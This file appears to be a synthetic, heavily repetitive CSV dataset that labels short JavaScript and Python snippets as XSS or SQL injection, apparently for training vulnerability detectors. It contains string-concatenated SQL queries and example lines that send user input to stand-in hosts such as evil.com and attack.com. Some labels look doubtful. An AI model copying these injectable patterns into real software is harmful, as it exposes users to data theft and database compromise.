Code Snippet,Vulnerability Type,Location,Preprocessed Tokens
"document.write('<script src=""evil.js""></script>');",XSS,5,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,20,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,11,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,13,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.location = 'http://evil.com?username=' + user_input;,XSS,12,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,6,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,14,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,2,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
alert('Hello ' + user_input);,XSS,14,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
alert('Hello ' + user_input);,XSS,9,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,9,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,18,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,13,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,11,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,11,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.getElementById('input').innerHTML = user_input;,XSS,7,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,8,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,9,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,14,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,11,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,8,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,13,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,1,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
"document.write('<script src=""evil.js""></script>');",XSS,12,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,10,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,2,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,13,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,13,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,12,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,12,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,16,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,4,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,18,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,12,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,4,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,20,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,16,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.location = 'http://evil.com?username=' + user_input;,XSS,3,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,3,"[""alert('Hello"", ""'"", '+', 'user_input);']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,17,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,13,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,19,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,13,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,7,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,7,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.location = 'http://evil.com?username=' + user_input;,XSS,2,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,20,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,6,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
alert('Hello ' + user_input);,XSS,18,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,17,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,2,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,9,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,11,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,3,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,9,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,2,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,7,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,5,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,1,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,14,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,15,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,20,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,3,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,11,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,4,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,19,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,17,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,20,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,12,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,4,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,5,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,14,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
"document.write('<script src=""evil.js""></script>');",XSS,8,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,10,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,14,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,7,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,20,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
alert('Hello ' + user_input);,XSS,20,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.getElementById('input').innerHTML = user_input;,XSS,13,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,13,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
alert('Hello ' + user_input);,XSS,12,"[""alert('Hello"", ""'"", '+', 'user_input);']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,17,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,12,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,11,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.location = 'http://evil.com?username=' + user_input;,XSS,19,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,18,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,12,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,20,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,3,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,18,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,13,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,11,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,18,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
"document.write('<script src=""evil.js""></script>');",XSS,13,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
alert('Hello ' + user_input);,XSS,15,"[""alert('Hello"", ""'"", '+', 'user_input);']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,12,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,4,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,12,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,2,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.getElementById('input').innerHTML = user_input;,XSS,12,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,5,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,20,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,9,"[""alert('Hello"", ""'"", '+', 'user_input);']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,15,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,10,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,4,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,4,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
alert('Hello ' + user_input);,XSS,5,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,16,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,16,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,16,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.getElementById('input').innerHTML = user_input;,XSS,1,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,20,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,9,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,12,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
"document.write('<script src=""evil.js""></script>');",XSS,10,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,6,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,17,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,14,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,4,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,1,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,20,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,5,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,18,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
"document.write('<script src=""evil.js""></script>');",XSS,6,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,12,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,17,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,19,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,1,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,20,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
alert('Hello ' + user_input);,XSS,17,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,14,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,6,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,7,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,10,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,18,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,1,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
alert('Hello ' + user_input);,XSS,19,"[""alert('Hello"", ""'"", '+', 'user_input);']"
alert('Hello ' + user_input);,XSS,4,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.getElementById('input').innerHTML = user_input;,XSS,1,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,3,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,2,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,10,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,9,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,13,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,14,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,6,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,9,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,9,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,7,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,14,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,13,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,8,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,19,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,17,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,18,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,3,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,6,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,19,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,6,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,6,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.location = 'http://evil.com?username=' + user_input;,XSS,10,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,10,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
